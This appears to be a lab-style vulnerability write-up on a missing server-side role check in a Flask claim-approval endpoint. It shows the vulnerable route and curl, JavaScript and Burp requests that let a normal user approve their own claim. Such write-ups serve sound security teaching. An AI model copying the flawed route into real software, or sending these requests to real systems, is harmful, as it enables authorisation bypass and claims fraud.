# Business Logic Flaw — Broken Approval Workflow

**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html) — Missing Authorisation

---

## Vulnerability Summary

The claim approval/rejection endpoint (`/claim/<id>/approve`) does not enforce a server-side role check. Access control relies entirely on client-side UI visibility — the Approve/Reject buttons are only rendered on the OIC review page. However, the endpoint itself accepts requests from any authenticated user, meaning a normal staff user can directly call the endpoint to approve their own submitted claims.

### Vulnerable Code

**`app.py` — `/claim/<id>/approve` route (no role check):**
```python
@app.route('/claim/<int:claim_id>/approve', methods=['POST'])
@login_required
def approve_claim(claim_id):
    # NOTE: No server-side role enforcement — any logged-in user can approve/reject
    claim = Claim.query.get_or_404(claim_id)
    action = request.form.get('action')  # 'approve' or 'reject'
    ...
    if action == 'approve':
        claim.status = 'approved'
```

The only protection is `@login_required`, which verifies the user is authenticated — not that they are an OIC staff member.

---

## Exploitation Steps

### Step 1 — Log in as a normal staff user

```
Username: staff_user
Password: staff_pass
```

### Step 2 — Submit a claim

Navigate to `/submit-claim`, fill in the form, and submit. Note the claim ID from the dashboard or the URL after submission (e.g., `/claim/3`).

### Step 3 — Send a direct POST request to approve the claim

Using `curl`, Burp Suite, or the browser developer console, send a POST request directly to the approval endpoint:

**Using curl:**
```bash
curl -X POST http://localhost:5000/claim/3/approve \
  -d "action=approve&review_notes=Self-approved" \
  -b "session=<your_session_cookie>"
```

**Using the browser console (JavaScript):**
```javascript
fetch('/claim/3/approve', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'action=approve&review_notes=Self-approved'
}).then(r => r.text()).then(console.log);
```

> Replace `/claim/3/approve` with the actual ID of the claim you submitted.

**Using Burp Suite (intercept and replay):**
1. Log in as staff and capture any POST request to the app.
2. Modify the request:
   ```
   POST /claim/3/approve HTTP/1.1
   Cookie: session=<staff_session_cookie>
   Content-Type: application/x-www-form-urlencoded

   action=approve&review_notes=Self-approved
   ```
3. Forward the request.

### Step 4 — Confirm the claim is approved

Return to your staff dashboard (`/`) or view the claim directly (`/claim/3`). The claim status should now show **APPROVED**, and `reviewed_by` will be set to the staff user's own ID.

---

## How the UI Hides It (But Doesn't Enforce It)

In `templates/oic/review_claim.html`, the Approve/Reject buttons are only rendered when `claim.status == 'pending'`, and the page itself is only accessible to OIC users via the `review_claim` route (which does check `current_user.is_oic()`). However, the **approval endpoint** (`approve_claim`) has no such check:

```python
# This route IS protected:
@app.route('/oic/review-claim/<int:claim_id>')
def review_claim(claim_id):
    if not current_user.is_oic():
        flash('Access denied. OIC staff only.', 'error')

# This route is NOT protected:
@app.route('/claim/<int:claim_id>/approve', methods=['POST'])
def approve_claim(claim_id):
    # No is_oic() check here
```

---

## Impact

- **Authorisation bypass** — a normal staff user can approve their own claims without OIC oversight.
- **Fraud risk** — claims that should be reviewed and potentially rejected can be self-approved.
- **Audit trail corruption** — `reviewed_by` is set to the staff user's own ID, creating a misleading audit record.

---

## Root Cause

The server relies on client-side UI controls (button visibility) rather than enforcing a server-side role check on the approval endpoint. The `@login_required` decorator only confirms authentication, not authorisation.
